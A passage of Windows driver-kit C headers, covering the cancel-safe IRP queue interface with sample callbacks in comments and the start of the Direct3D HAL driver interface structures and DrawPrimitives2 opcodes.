 * change this and hope for the best!
 *
 * USAGE
 *
 * This library follows exactly the same interface as the Microsoft Cancel-Safe
 * Queue routines (IoCsqXxx()).  As such, the authoritative reference is the
 * current DDK.  There is also a DDK sample called "cancel" that has an
 * example of how to use this code.  I have also provided a sample driver
 * that makes use of this queue. Finally, please do read the header and the
 * source if you're curious about the inner workings of these routines.
 */

#pragma once

#define _CSQ_H_

#ifdef __cplusplus
extern "C" {
#endif

/*
 * Prevent including the CSQ definitions twice. They're present in NTDDK
 * now too, except the *_EX versions.
 */
#ifndef IO_TYPE_CSQ_IRP_CONTEXT

typedef struct _IO_CSQ IO_CSQ, *PIO_CSQ;

/*
 * STRUCTURES
 *
 * NOTE:  Please do not use these directly.  You will make incompatible code
 * if you do.  Always only use the documented IoCsqXxx() interfaces and you
 * will amass much Good Karma.
 */
#define IO_TYPE_CSQ_IRP_CONTEXT 1
#define IO_TYPE_CSQ 2

/*
 * IO_CSQ_IRP_CONTEXT - Context used to track an IRP in the CSQ
 */
typedef struct _IO_CSQ_IRP_CONTEXT {
  ULONG Type;
  PIRP Irp;
  PIO_CSQ Csq;
} IO_CSQ_IRP_CONTEXT, *PIO_CSQ_IRP_CONTEXT;

/*
 * CSQ Callbacks
 *
 * The cancel-safe queue is implemented as a set of IoCsqXxx() OS routines
 * copuled with a set of driver callbacks to handle the basic operations of
 * the queue.  You need to supply one of each of these functions in your own
 * driver.  These routines are also documented in the DDK under CsqXxx().
 * That is the authoritative documentation.
 */

/*
 * Function to insert an IRP in the queue.  No need to worry about locking;
 * just tack it onto your list or something.
 *
 * Sample implementation:
 *
  VOID NTAPI CsqInsertIrp(PIO_CSQ Csq, PIRP Irp)
  {
    KdPrint(("Inserting IRP 0x%x into CSQ\n", Irp));
    InsertTailList(&IrpQueue, &Irp->Tail.Overlay.ListEntry);
  }
 *
 */
typedef VOID
(NTAPI IO_CSQ_INSERT_IRP)(
  IN struct _IO_CSQ *Csq,
  IN PIRP Irp);
typedef IO_CSQ_INSERT_IRP *PIO_CSQ_INSERT_IRP;

/*
 * Function to remove an IRP from the queue.
 *
 * Sample:
 *
  VOID NTAPI CsqRemoveIrp(PIO_CSQ Csq, PIRP Irp)
  {
    KdPrint(("Removing IRP 0x%x from CSQ\n", Irp));
    RemoveEntryList(&Irp->Tail.Overlay.ListEntry);
  }
 *
 */
typedef VOID
(NTAPI IO_CSQ_REMOVE_IRP)(
  IN struct _IO_CSQ *Csq,
  IN PIRP Irp);
typedef IO_CSQ_REMOVE_IRP *PIO_CSQ_REMOVE_IRP;

/*
 * Function to look for an IRP in the queue
 *
 * Sample:
 *
  PIRP NTAPI CsqPeekNextIrp(PIO_CSQ Csq, PIRP Irp, PVOID PeekContext)
  {
    KdPrint(("Peeking for next IRP\n"));

    if(Irp)
      return CONTAINING_RECORD(&Irp->Tail.Overlay.ListEntry.Flink, IRP, Tail.Overlay.ListEntry);

    if(IsListEmpty(&IrpQueue))
      return NULL;

    return CONTAINING_RECORD(IrpQueue.Flink, IRP, Tail.Overlay.ListEntry);
  }
 *
 */
typedef PIRP
(NTAPI IO_CSQ_PEEK_NEXT_IRP)(
  IN struct _IO_CSQ *Csq,
  IN PIRP Irp,
  IN PVOID PeekContext);
typedef IO_CSQ_PEEK_NEXT_IRP *PIO_CSQ_PEEK_NEXT_IRP;

/*
 * Lock the queue.  This can be a spinlock, a mutex, or whatever
 * else floats your boat.
 *
 * Sample:
 *
  VOID NTAPI CsqAcquireLock(PIO_CSQ Csq, PKIRQL Irql)
  {
    KdPrint(("Acquiring spin lock\n"));
    KeAcquireSpinLock(&IrpQueueLock, Irql);
  }
 *
 */
typedef VOID
(NTAPI IO_CSQ_ACQUIRE_LOCK)(
  IN struct _IO_CSQ *Csq,
  OUT PKIRQL Irql);
typedef IO_CSQ_ACQUIRE_LOCK *PIO_CSQ_ACQUIRE_LOCK;

/*
 * Unlock the queue:
 *
  VOID NTAPI CsqReleaseLock(PIO_CSQ Csq, KIRQL Irql)
  {
    KdPrint(("Releasing spin lock\n"));
    KeReleaseSpinLock(&IrpQueueLock, Irql);
  }
 *
 */
typedef VOID
(NTAPI IO_CSQ_RELEASE_LOCK)(
  IN struct _IO_CSQ *Csq,
  IN KIRQL Irql);
typedef IO_CSQ_RELEASE_LOCK *PIO_CSQ_RELEASE_LOCK;

/*
 * Finally, this is called by the queue library when it wants to complete
 * a canceled IRP.
 *
 * Sample:
 *
  VOID NTAPI CsqCompleteCancelledIrp(PIO_CSQ Csq, PIRP Irp)
  {
    KdPrint(("cancelling irp 0x%x\n", Irp));
    Irp->IoStatus.Status = STATUS_CANCELLED;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
  }
 *
 */
typedef VOID
(NTAPI IO_CSQ_COMPLETE_CANCELED_IRP)(
  IN struct _IO_CSQ *Csq,
  IN PIRP Irp);
typedef IO_CSQ_COMPLETE_CANCELED_IRP *PIO_CSQ_COMPLETE_CANCELED_IRP;

/*
 * IO_CSQ - Queue control structure
 */
typedef struct _IO_CSQ {
  ULONG Type;
  PIO_CSQ_INSERT_IRP CsqInsertIrp;
  PIO_CSQ_REMOVE_IRP CsqRemoveIrp;
  PIO_CSQ_PEEK_NEXT_IRP CsqPeekNextIrp;
  PIO_CSQ_ACQUIRE_LOCK CsqAcquireLock;
  PIO_CSQ_RELEASE_LOCK CsqReleaseLock;
  PIO_CSQ_COMPLETE_CANCELED_IRP CsqCompleteCanceledIrp;
  PVOID ReservePointer; /* must be NULL */
} IO_CSQ, *PIO_CSQ;

#endif /* IO_TYPE_CSQ_IRP_CONTEXT */

#ifndef IO_TYPE_CSQ_EX

/* See IO_TYPE_CSQ_* above */
#define IO_TYPE_CSQ_EX 3

/*
 * Function to insert an IRP into the queue with extended context information.
 * This is useful if you need to be able to de-queue particular IRPs more
 * easily in some cases.
 *
 * Same deal as above; sample implementation:
 *
  NTSTATUS NTAPI CsqInsertIrpEx(PIO_CSQ Csq, PIRP Irp, PVOID InsertContext)
  {
    CsqInsertIrp(Csq, Irp);
    return STATUS_PENDING;
  }
 *
 */
typedef NTSTATUS
(NTAPI IO_CSQ_INSERT_IRP_EX)(
  IN struct _IO_CSQ *Csq,
  IN PIRP Irp,
  IN PVOID InsertContext);
typedef IO_CSQ_INSERT_IRP_EX *PIO_CSQ_INSERT_IRP_EX;

#endif /* IO_TYPE_CSQ_EX */

/*
 * CANCEL-SAFE QUEUE DDIs
 *
 * These device driver interfaces are called to make use of the queue.  Again,
 * authoritative documentation for these functions is in the DDK.  The csqtest
 * driver also makes use of some of them.
 */


/*
 * Call this in DriverEntry or similar in order to set up the Csq structure.
 * As long as the Csq struct and the functions you pass in are resident,
 * there are no IRQL restrictions.
 */
NTKERNELAPI
NTSTATUS NTAPI IoCsqInitialize(PIO_CSQ Csq,
                               PIO_CSQ_INSERT_IRP CsqInsertIrp,
                               PIO_CSQ_REMOVE_IRP CsqRemoveIrp,
                               PIO_CSQ_PEEK_NEXT_IRP CsqPeekNextIrp,
                               PIO_CSQ_ACQUIRE_LOCK CsqAcquireLock,
                               PIO_CSQ_RELEASE_LOCK CsqReleaseLock,
                               PIO_CSQ_COMPLETE_CANCELED_IRP CsqCompleteCanceledIrp);

/*
 * Same as above, except you provide a CsqInsertIrpEx routine instead of
 * CsqInsertIrp.  This eventually allows you to supply extra tracking
 * information for use with the queue.
 */
NTKERNELAPI
NTSTATUS NTAPI IoCsqInitializeEx(PIO_CSQ Csq,
                                 PIO_CSQ_INSERT_IRP_EX CsqInsertIrpEx,
                                 PIO_CSQ_REMOVE_IRP CsqRemoveIrp,
                                 PIO_CSQ_PEEK_NEXT_IRP CsqPeekNextIrp,
                                 PIO_CSQ_ACQUIRE_LOCK CsqAcquireLock,
                                 PIO_CSQ_RELEASE_LOCK CsqReleaseLock,
                                 PIO_CSQ_COMPLETE_CANCELED_IRP CsqCompleteCanceledIrp);

/*
 * Insert an IRP into the queue
 */
NTKERNELAPI
VOID NTAPI IoCsqInsertIrp(PIO_CSQ Csq,
                          PIRP Irp,
                          PIO_CSQ_IRP_CONTEXT Context);

/*
 * Insert an IRP into the queue, with special context maintained that
 * makes it easy to find IRPs in the queue
 */
NTKERNELAPI
NTSTATUS NTAPI IoCsqInsertIrpEx(PIO_CSQ Csq,
                                PIRP Irp,
                                PIO_CSQ_IRP_CONTEXT Context,
                                PVOID InsertContext);

/*
 * Remove a particular IRP from the queue
 */
NTKERNELAPI
PIRP NTAPI IoCsqRemoveIrp(PIO_CSQ Csq,
                          PIO_CSQ_IRP_CONTEXT Context);

/*
 * Remove the next IRP from the queue
 */
NTKERNELAPI
PIRP NTAPI IoCsqRemoveNextIrp(PIO_CSQ Csq,
                              PVOID PeekContext);

#ifdef __cplusplus
}
#endif

```

`include/ddk/d3dhal.h`:

```h
/*
 * Direct3D driver interface
 * (DirectX 7 version)
 *
 * Copyright (C) 2001 Ove Kaaven
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 */

#ifndef _D3DHAL_H_
#define _D3DHAL_H_

#ifdef __cplusplus
extern "C" {
#endif

#include <ddraw.h>
#include <d3dtypes.h>
#include <d3dcaps.h>
#include <d3d.h>

#if (DIRECT3D_VERSION >= 0x0900)
#include <d3d9.h>
#endif

#ifndef DDRAWI_DIRECTDRAW_DEFINED
typedef struct _DDRAWI_DIRECTDRAW_GBL FAR *LPDDRAWI_DIRECTDRAW_GBL;
typedef struct _DDRAWI_DIRECTDRAW_LCL FAR *LPDDRAWI_DIRECTDRAW_LCL;
#define DDRAWI_DIRECTDRAW_DEFINED
#endif

#ifndef DDRAWI_DDRAWSURFACE_DEFINED
typedef struct _DDRAWI_DDRAWSURFACE_LCL FAR *LPDDRAWI_DDRAWSURFACE_LCL;
#define DDRAWI_DDRAWSURFACE_DEFINED
#endif

#define D3DERR_COMMAND_UNPARSED 0x88760BB8;

/*****************************************************************************
 * device info structures
 */
typedef struct _D3DDeviceDesc_V1 {
  DWORD			dwSize;
  DWORD			dwFlags;
  D3DCOLORMODEL		dcmColorModel;
  DWORD			dwDevCaps;
  D3DTRANSFORMCAPS	dtcTransformCaps;
  BOOL			bClipping;
  D3DLIGHTINGCAPS	dlcLightingCaps;
  D3DPRIMCAPS		dpcLineCaps;
  D3DPRIMCAPS		dpcTriCaps;
  DWORD			dwDeviceRenderBitDepth;
  DWORD			dwDeviceZBufferBitDepth;
  DWORD			dwMaxBufferSize;
  DWORD			dwMaxVertexCount;
} D3DDEVICEDESC_V1,*LPD3DDEVICEDESC_V1;

/* this is to allow keeping the bulk of our OpenGL code out of x11drv */
#define D3DDD_WINE_OPENGL_DEVICE 0x00008000

typedef struct _D3DHAL_GLOBALDRIVERDATA {
  DWORD			dwSize;
  D3DDEVICEDESC_V1	hwCaps;
  DWORD			dwNumVertices;
  DWORD			dwNumClipVertices;
  DWORD			dwNumTextureFormats;
  LPDDSURFACEDESC	lpTextureFormats;
} D3DHAL_GLOBALDRIVERDATA;

#ifndef D3DHAL_GLOBALDRIVERDATA_DEFINED
typedef D3DHAL_GLOBALDRIVERDATA *LPD3DHAL_GLOBALDRIVERDATA;
#define D3DHAL_GLOBALDRIVERDATA_DEFINED
#endif

typedef struct _D3DHAL_D3DEXTENDEDCAPS {
  DWORD			dwSize;
  /* DirectX 5 */
  DWORD			dwMinTextureWidth, dwMaxTextureWidth;
  DWORD			dwMinTextureHeight, dwMaxTextureHeight;
  DWORD			dwMinStippleWidth, dwMaxStippleWidth;
  DWORD			dwMinStippleHeight, dwMaxStippleHeight;
  /* DirectX 6 */
  DWORD			dwMaxTextureRepeat;
  DWORD			dwMaxTextureAspectRatio;
  DWORD			dwMaxAnisotropy;
  D3DVALUE		dvGuardBandLeft;
  D3DVALUE		dvGuardBandTop;
  D3DVALUE		dvGuardBandRight;
  D3DVALUE		dvGuardBandBottom;
  D3DVALUE		dvExtentsAdjust;
  DWORD			dwStencilCaps;
  DWORD			dwFVFCaps;
  DWORD			dwTextureOpCaps;
  WORD			wMaxTextureBlendStages;
  WORD			wMaxSimultaneousTextures;
  /* DirectX 7 */
  DWORD			dwMaxActiveLights;
  D3DVALUE		dvMaxVertexW;
  WORD			wMaxUserClipPlanes;
  WORD			wMaxVertexBlendMatrices;
  DWORD			dwVertexProcessingCaps;
  DWORD			dwReserved1;
  DWORD			dwReserved2;
  DWORD			dwReserved3;
  DWORD			dwReserved4;
} D3DHAL_D3DEXTENDEDCAPS,*LPD3DHAL_D3DEXTENDEDCAPS;

/*****************************************************************************
 * d3d->driver callbacks
 */
typedef struct _D3DHAL_CONTEXTCREATEDATA	*LPD3DHAL_CONTEXTCREATEDATA;
typedef struct _D3DHAL_CONTEXTDESTROYDATA	*LPD3DHAL_CONTEXTDESTROYDATA;
typedef struct _D3DHAL_CONTEXTDESTROYALLDATA	*LPD3DHAL_CONTEXTDESTROYALLDATA;
typedef struct _D3DHAL_SCENECAPTUREDATA		*LPD3DHAL_SCENECAPTUREDATA;
typedef struct _D3DHAL_RENDERSTATEDATA		*LPD3DHAL_RENDERSTATEDATA;
typedef struct _D3DHAL_RENDERPRIMITIVEDATA	*LPD3DHAL_RENDERPRIMITIVEDATA;
typedef struct _D3DHAL_TEXTURECREATEDATA	*LPD3DHAL_TEXTURECREATEDATA;
typedef struct _D3DHAL_TEXTUREDESTROYDATA	*LPD3DHAL_TEXTUREDESTROYDATA;
typedef struct _D3DHAL_TEXTURESWAPDATA		*LPD3DHAL_TEXTURESWAPDATA;
typedef struct _D3DHAL_TEXTUREGETSURFDATA	*LPD3DHAL_TEXTUREGETSURFDATA;
typedef struct _D3DHAL_GETSTATEDATA		*LPD3DHAL_GETSTATEDATA;

typedef DWORD (PASCAL *LPD3DHAL_CONTEXTCREATECB)    (LPD3DHAL_CONTEXTCREATEDATA);
typedef DWORD (PASCAL *LPD3DHAL_CONTEXTDESTROYCB)   (LPD3DHAL_CONTEXTDESTROYDATA);
typedef DWORD (PASCAL *LPD3DHAL_CONTEXTDESTROYALLCB)(LPD3DHAL_CONTEXTDESTROYALLDATA);
typedef DWORD (PASCAL *LPD3DHAL_SCENECAPTURECB)	    (LPD3DHAL_SCENECAPTUREDATA);
typedef DWORD (PASCAL *LPD3DHAL_RENDERSTATECB)	    (LPD3DHAL_RENDERSTATEDATA);
typedef DWORD (PASCAL *LPD3DHAL_RENDERPRIMITIVECB)  (LPD3DHAL_RENDERPRIMITIVEDATA);
typedef DWORD (PASCAL *LPD3DHAL_TEXTURECREATECB)    (LPD3DHAL_TEXTURECREATEDATA);
typedef DWORD (PASCAL *LPD3DHAL_TEXTUREDESTROYCB)   (LPD3DHAL_TEXTUREDESTROYDATA);
typedef DWORD (PASCAL *LPD3DHAL_TEXTURESWAPCB)	    (LPD3DHAL_TEXTURESWAPDATA);
typedef DWORD (PASCAL *LPD3DHAL_TEXTUREGETSURFCB)   (LPD3DHAL_TEXTUREGETSURFDATA);
typedef DWORD (PASCAL *LPD3DHAL_GETSTATECB)	    (LPD3DHAL_GETSTATEDATA);

typedef struct _D3DHAL_CALLBACKS {
  DWORD				dwSize;
  LPD3DHAL_CONTEXTCREATECB	ContextCreate;
  LPD3DHAL_CONTEXTDESTROYCB	ContextDestroy;
  LPD3DHAL_CONTEXTDESTROYALLCB	ContextDestroyAll;
  LPD3DHAL_SCENECAPTURECB	SceneCapture;
  LPVOID			lpReserved10;
  LPVOID			lpReserved11;
  LPD3DHAL_RENDERSTATECB	RenderState;
  LPD3DHAL_RENDERPRIMITIVECB	RenderPrimitive;
  DWORD				dwReserved;
  LPD3DHAL_TEXTURECREATECB	TextureCreate;
  LPD3DHAL_TEXTUREDESTROYCB	TextureDestroy;
  LPD3DHAL_TEXTURESWAPCB	TextureSwap;
  LPD3DHAL_TEXTUREGETSURFCB	TextureGetSurf;
  /* now why did MS create CALLBACKS2 and CALLBACKS3 structures if
   * all these reserved fields were available? we may never know */
  LPVOID			lpReserved12;
  LPVOID			lpReserved13;
  LPVOID			lpReserved14;
  LPVOID			lpReserved15;
  LPVOID			lpReserved16;
  LPVOID			lpReserved17;
  LPVOID			lpReserved18;
  LPVOID			lpReserved19;
  LPVOID			lpReserved20;
  LPVOID			lpReserved21;
  LPD3DHAL_GETSTATECB		GetState;
  DWORD				dwReserved0;
  DWORD				dwReserved1;
  DWORD				dwReserved2;
  DWORD				dwReserved3;
  DWORD				dwReserved4;
  DWORD				dwReserved5;
  DWORD				dwReserved6;
  DWORD				dwReserved7;
  DWORD				dwReserved8;
  DWORD				dwReserved9;
} D3DHAL_CALLBACKS;

#ifndef D3DHAL_CALLBACKS_DEFINED
typedef D3DHAL_CALLBACKS *LPD3DHAL_CALLBACKS;
#define D3DHAL_CALLBACKS_DEFINED
#endif

typedef struct _D3DHAL_SETRENDERTARGETDATA		*LPD3DHAL_SETRENDERTARGETDATA;
typedef struct _D3DHAL_CLEARDATA			*LPD3DHAL_CLEARDATA;
typedef struct _D3DHAL_DRAWONEPRIMITIVEDATA		*LPD3DHAL_DRAWONEPRIMITIVEDATA;
typedef struct _D3DHAL_DRAWONEINDEXEDPRIMITIVEDATA	*LPD3DHAL_DRAWONEINDEXEDPRIMITIVEDATA;
typedef struct _D3DHAL_DRAWPRIMITIVESDATA		*LPD3DHAL_DRAWPRIMITIVESDATA;

typedef DWORD (PASCAL *LPD3DHAL_SETRENDERTARGETCB)	  (LPD3DHAL_SETRENDERTARGETDATA);
typedef DWORD (PASCAL *LPD3DHAL_CLEARCB)		  (LPD3DHAL_CLEARDATA);
typedef DWORD (PASCAL *LPD3DHAL_DRAWONEPRIMITIVECB)	  (LPD3DHAL_DRAWONEPRIMITIVEDATA);
typedef DWORD (PASCAL *LPD3DHAL_DRAWONEINDEXEDPRIMITIVECB)(LPD3DHAL_DRAWONEINDEXEDPRIMITIVEDATA);
typedef DWORD (PASCAL *LPD3DHAL_DRAWPRIMITIVESCB)	  (LPD3DHAL_DRAWPRIMITIVESDATA);

typedef struct _D3DHAL_CALLBACKS2 {
  DWORD					dwSize;
  DWORD					dwFlags;
  LPD3DHAL_SETRENDERTARGETCB		SetRenderTarget;
  LPD3DHAL_CLEARCB			Clear;
  LPD3DHAL_DRAWONEPRIMITIVECB		DrawOnePrimitive;
  LPD3DHAL_DRAWONEINDEXEDPRIMITIVECB	DrawOneIndexedPrimitive;
  LPD3DHAL_DRAWPRIMITIVESCB		DrawPrimitives;
} D3DHAL_CALLBACKS2,*LPD3DHAL_CALLBACKS2;

typedef struct _D3DHAL_CLEAR2DATA			*LPD3DHAL_CLEAR2DATA;
typedef struct _D3DHAL_VALIDATETEXTURESTAGESTATEDATA	*LPD3DHAL_VALIDATETEXTURESTAGESTATEDATA;
typedef struct _D3DHAL_DRAWPRIMITIVES2DATA		*LPD3DHAL_DRAWPRIMITIVES2DATA;

typedef DWORD (PASCAL *LPD3DHAL_CLEAR2CB)		  (LPD3DHAL_CLEAR2DATA);
typedef DWORD (PASCAL *LPD3DHAL_VALIDATETEXTURESTAGESTATECB)(LPD3DHAL_VALIDATETEXTURESTAGESTATEDATA);
typedef DWORD (PASCAL *LPD3DHAL_DRAWPRIMITIVES2CB)	  (LPD3DHAL_DRAWPRIMITIVES2DATA);

typedef struct _D3DHAL_CALLBACKS3 {
  DWORD					dwSize;
  DWORD					dwFlags;
  LPD3DHAL_CLEAR2CB			Clear2;
  LPVOID				lpvReserved;
  LPD3DHAL_VALIDATETEXTURESTAGESTATECB	ValidateTextureStageState;
  LPD3DHAL_DRAWPRIMITIVES2CB		DrawPrimitives2;
} D3DHAL_CALLBACKS3,*LPD3DHAL_CALLBACKS3;

/*****************************************************************************
 * parameter structures
 */
typedef struct _D3DHAL_CONTEXTCREATEDATA {
  _ANONYMOUS_UNION union {
    LPDDRAWI_DIRECTDRAW_GBL	lpDDGbl; /* pre-DirectX 7 */
    LPDDRAWI_DIRECTDRAW_LCL	lpDDLcl; /* DirectX 7 */
  } DUMMYUNIONNAME1;
  _ANONYMOUS_UNION union {
    LPDIRECTDRAWSURFACE		lpDDS;
    LPDDRAWI_DDRAWSURFACE_LCL	lpDDSLcl; /* DirectX 7 */
  } DUMMYUNIONNAME2;
  _ANONYMOUS_UNION union {
    LPDIRECTDRAWSURFACE		lpDDSZ;
    LPDDRAWI_DDRAWSURFACE_LCL	lpDDSZLcl; /* DirectX 7 */
  } DUMMYUNIONNAME3;
  _ANONYMOUS_UNION union {
    DWORD			dwPID;
    ULONG_PTR			dwrstates;
  } DUMMYUNIONNAME4;
  ULONG_PTR			dwhContext;
  HRESULT			ddrval;
} D3DHAL_CONTEXTCREATEDATA;

typedef struct _D3DHAL_CONTEXTDESTROYDATA {
  ULONG_PTR			dwhContext;
  HRESULT			ddrval;
} D3DHAL_CONTEXTDESTROYDATA;

typedef struct _D3DHAL_CONTEXTDESTROYALLDATA {
  DWORD				dwPID;
  HRESULT			ddrval;
} D3DHAL_CONTEXTDESTROYALLDATA;

typedef struct _D3DHAL_SCENECAPTUREDATA {
  ULONG_PTR			dwhContext;
  DWORD				dwFlag;
  HRESULT			ddrval;
} D3DHAL_SCENECAPTUREDATA;

#define D3DHAL_SCENE_CAPTURE_START	0x00000000
#define D3DHAL_SCENE_CAPTURE_END	0x00000001

typedef struct _D3DHAL_SETRENDERTARGETDATA {
  ULONG_PTR			dwhContext;
  _ANONYMOUS_UNION union {
    LPDIRECTDRAWSURFACE		lpDDS;
    LPDDRAWI_DDRAWSURFACE_LCL	lpDDSLcl;
  } DUMMYUNIONNAME1;
  _ANONYMOUS_UNION union {
    LPDIRECTDRAWSURFACE		lpDDSZ;
    LPDDRAWI_DDRAWSURFACE_LCL	lpDDSZLcl;
  } DUMMYUNIONNAME2;
  HRESULT			ddrval;
} D3DHAL_SETRENDERTARGETDATA;

typedef struct _D3DHAL_DRAWPRIMITIVES2DATA {
  ULONG_PTR			dwhContext;
  DWORD				dwFlags;
  DWORD				dwVertexType;
  LPDDRAWI_DDRAWSURFACE_LCL	lpDDCommands;
  DWORD				dwCommandOffset;
  DWORD				dwCommandLength;
  _ANONYMOUS_UNION union {
    LPDDRAWI_DDRAWSURFACE_LCL	lpDDVertex;
    LPVOID			lpVertices;
  } DUMMYUNIONNAME1;
  DWORD				dwVertexOffset;
  DWORD				dwVertexLength;
  DWORD				dwReqVertexBufSize;
  DWORD				dwReqCommandBufSize;
  LPDWORD			lpdwRStates;
  _ANONYMOUS_UNION union {
    DWORD			dwVertexSize;
    HRESULT			ddrval;
  } DUMMYUNIONNAME2;
  DWORD				dwErrorOffset;
} D3DHAL_DRAWPRIMITIVES2DATA;

#define D3DHALDP2_USERMEMVERTICES	0x00000001
#define D3DHALDP2_EXECUTEBUFFER		0x00000002
#define D3DHALDP2_SWAPVERTEXBUFFER	0x00000004
#define D3DHALDP2_SWAPCOMMANDBUFFER	0x00000008
#define D3DHALDP2_REQVERTEXBUFSIZE	0x00000010
#define D3DHALDP2_REQCOMMANDBUFSIZE	0x00000020
#define D3DHALDP2_VIDMEMVERTEXBUF	0x00000040
#define D3DHALDP2_VIDMEMCOMMANDBUF	0x00000080

/*****************************************************************************
 * DrawPrimitives2 command structures
 */
typedef struct _D3DHAL_DP2COMMAND {
  BYTE bCommand;
  BYTE bReserved;
  _ANONYMOUS_UNION union {
    WORD wPrimitiveCount;
    WORD wStateCount;
  } DUMMYUNIONNAME;
} D3DHAL_DP2COMMAND,*LPD3DHAL_DP2COMMAND;

typedef enum _D3DHAL_DP2OPERATION {
  D3DDP2OP_POINTS		= 1,
  D3DDP2OP_INDEXEDLINELIST	= 2,
  D3DDP2OP_INDEXEDTRIANGLELIST	= 3,
  D3DDP2OP_RENDERSTATE		= 8,
  D3DDP2OP_LINELIST		= 15,
  D3DDP2OP_LINESTRIP		= 16,
  D3DDP2OP_INDEXEDLINESTRIP	= 17,
  D3DDP2OP_TRIANGLELIST		= 18,
  D3DDP2OP_TRIANGLESTRIP	= 19,
  D3DDP2OP_INDEXEDTRIANGLESTRIP	= 20,
  D3DDP2OP_TRIANGLEFAN		= 21,
  D3DDP2OP_INDEXEDTRIANGLEFAN	= 22,
  D3DDP2OP_TRIANGLEFAN_IMM	= 23,
  D3DDP2OP_LINELIST_IMM		= 24,
  D3DDP2OP_TEXTURESTAGESTATE	= 25,
  D3DDP2OP_INDEXEDTRIANGLELIST2	= 26,
  D3DDP2OP_INDEXEDLINELIST2	= 27,
  D3DDP2OP_VIEWPORTINFO		= 28,
  D3DDP2OP_WINFO		= 29,
  /* pre-DirectX 7 interfaces */
  D3DDP2OP_SETPALETTE		= 30,
  D3DDP2OP_UPDATEPALETTE	= 31,
  /* DirectX 7 interfaces */
  D3DDP2OP_ZRANGE		= 32,
  D3DDP2OP_SETMATERIAL		= 33,
  D3DDP2OP_SETLIGHT		= 34,
  D3DDP2OP_CREATELIGHT		= 35,
  D3DDP2OP_SETTRANSFORM		= 36,
  D3DDP2OP_TEXBLT		= 38,
  D3DDP2OP_STATESET		= 39,
  D3DDP2OP_SETPRIORITY		= 40,
  /* all interfaces */
  D3DDP2OP_SETRENDERTARGET	= 41,
  D3DDP2OP_CLEAR		= 42,
  /* DirectX 7 interfaces */
  D3DDP2OP_SETTEXLOD		= 43,
  D3DPP2OP_SETCLIPPLANE		= 44,
#if(DIRECT3D_VERSION >= 0x0800)
  D3DDP2OP_CREATEVERTEXSHADER	= 45,
  D3DDP2OP_DELETEVERTEXSHADER	= 46,
  D3DDP2OP_SETVERTEXSHADER	= 47,
  D3DDP2OP_SETVERTEXSHADERCONST	= 48,
  D3DDP2OP_SETSTREAMSOURCE	= 49,
  D3DDP2OP_SETSTREAMSOURCEUM	= 50,
  D3DDP2OP_SETINDICES		= 51,
  D3DDP2OP_DRAWPRIMITIVE	= 52,
  D3DDP2OP_DRAWINDEXEDPRIMITIVE	= 53,
  D3DDP2OP_CREATEPIXELSHADER	= 54,
  D3DDP2OP_DELETEPIXELSHADER	= 55,
  D3DDP2OP_SETPIXELSHADER	= 56,
  D3DDP2OP_SETPIXELSHADERCONST	= 57,
  D3DDP2OP_CLIPPEDTRIANGLEFAN	= 58,
  D3DDP2OP_DRAWPRIMITIVE2	= 59,
  D3DDP2OP_DRAWINDEXEDPRIMITIVE2= 60,
  D3DDP2OP_DRAWRECTPATCH	= 61,
  D3DDP2OP_DRAWTRIPATCH		= 62,
  D3DDP2OP_VOLUMEBLT		= 63,
  D3DDP2OP_BUFFERBLT		= 64,
  D3DDP2OP_MULTIPLYTRANSFORM	= 65,
  D3DDP2OP_ADDDIRTYRECT		= 66,
  D3DDP2OP_ADDDIRTYBOX		= 67,
#endif
#if(DIRECT3D_VERSION >= 0x0900)
  D3DDP2OP_CREATEVERTEXSHADERDECL	= 71,
  D3DDP2OP_DELETEVERTEXSHADERDECL	= 72,
  D3DDP2OP_SETVERTEXSHADERDECL		= 73,
  D3DDP2OP_CREATEVERTEXSHADERFUNC	= 74,
  D3DDP2OP_DELETEVERTEXSHADERFUNC	= 75,
  D3DDP2OP_SETVERTEXSHADERFUNC	= 76,
  D3DDP2OP_SETVERTEXSHADERCONSTI= 77,
  D3DDP2OP_SETSCISSORRECT	= 79,
  D3DDP2OP_SETSTREAMSOURCE2	= 80,
  D3DDP2OP_BLT			= 81,
  D3DDP2OP_COLORFILL		= 82,
  D3DDP2OP_SETVERTEXSHADERCONSTB= 83,
  D3DDP2OP_CREATEQUERY		= 84,
  D3DDP2OP_SETRENDERTARGET2	= 85,
  D3DDP2OP_SETDEPTHSTENCIL	= 86,
  D3DDP2OP_RESPONSECONTINUE	= 87,
  D3DDP2OP_RESPONSEQUERY	= 88,
  D3DDP2OP_GENERATEMIPSUBLEVELS	= 89,
  D3DDP2OP_DELETEQUERY		= 90,
  D3DDP2OP_ISSUEQUERY		= 91,
  D3DDP2OP_SETPIXELSHADERCONSTI	= 93,
  D3DDP2OP_SETPIXELSHADERCONSTB	= 94,
  D3DDP2OP_SETSTREAMSOURCEFREQ	= 95,
  D3DDP2OP_SURFACEBLT		= 96
#endif
} D3DHAL_DP2OPERATION;

/* point primitives */

typedef struct _D3DHAL_POINTS {
  WORD wCount;
  WORD wVStart;
} D3DHAL_DP2POINTS,*LPD3DHAL_DP2POINTS;

/* line primitives */

typedef struct _D3DHAL_DP2STARTVERTEX {
  WORD wVStart;
} D3DHAL_DP2STARTVERTEX,*LPD3DHAL_DP2STARTVERTEX;

typedef struct _D3DHAL_DP2LINELIST {
  WORD wVStart;
} D3DHAL_DP2LINELIST,*LPD3DHAL_DP2LINELIST;

typedef struct _D3DHAL_DP2INDEXEDLINELIST {
  WORD wV1;
  WORD wV2;
} D3DHAL_DP2INDEXEDLINELIST,*LPD3DHAL_DP2INDEXEDLINELIST;

typedef struct _D3DHAL_DP2LINESTRIP {
  WORD wVStart;
} D3DHAL_DP2LINESTRIP,*LPD3DHAL_DP2LINESTRIP;

typedef struct _D3DHAL_DP2INDEXEDLINESTRIP {
  WORD wV[2];
} D3DHAL_DP2INDEXEDLINESTRIP,*LPD3DHAL_DP2INDEXEDLINESTRIP;

/* triangle primitives */

typedef struct _D3DHAL_DP2TRIANGLELIST {
  WORD wVStart;
} D3DHAL_DP2TRIANGLELIST,*LPD3DHAL_DP2TRIANGLELIST;

